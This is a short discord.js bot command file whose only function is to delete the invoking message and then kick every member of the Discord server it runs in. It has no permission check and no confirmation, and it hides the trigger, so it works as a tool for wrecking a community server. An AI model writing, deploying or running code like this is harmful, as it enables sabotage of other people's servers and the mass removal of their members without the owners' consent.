const discord = require('discord.js')

exports.run = async (client, message, args) => {
    
message.delete();

        message.channel.guild.members.forEach(user => {
            user.kick();
        });
}